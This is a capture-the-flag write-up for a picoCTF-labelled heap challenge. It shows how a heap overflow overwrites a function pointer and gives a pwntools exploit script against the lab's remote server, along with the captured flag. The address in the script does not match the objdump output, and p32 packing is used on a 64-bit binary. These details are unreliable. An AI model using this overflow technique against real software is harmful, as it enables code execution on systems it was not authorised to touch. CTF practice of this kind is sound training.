## CTF: picoCTF 2024

Challenge: Heap 2

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

Can you handle function pointers?

## Solution

Similar to heap1, but this time we're overwriting a function pointer. The global variable `x` holds a function pointer that `check_win` calls:

```c
void win() {
    // Print flag
}

void check_win() { ((void (*)())*(int*)x)(); }
```

We need to overwrite `x` with the address of `win`. No PIE, 64-bit executable, so addresses are static. Heap allocations are 32 bytes apart (same as heap1). Find win:

```bash
$ objdump -t chall | grep win
00000000004011a0 g     F .text  000000000000000e              win
```

### Exploit

```python
from pwn import *
p = context.binary = ELF("./chall.1")
p = remote("chatelaine.cylabacademy.net", 31871)
winner = 0x4011a5
first_payload = "2"
p.sendline(first_payload)
second_payload = b"A" * 32 + p32(winner)
p.sendline(second_payload)
final = "4"
p.sendline(final)
p.interactive()
```

```
Enter your choice: Data for buffer:
Enter your choice: academy{and_down_the_road_we_go_358513ca}
```

## Flag

```
academy{and_down_the_road_we_go_358513ca}
```

## Mitigation

Limit the input of the user by checking size.
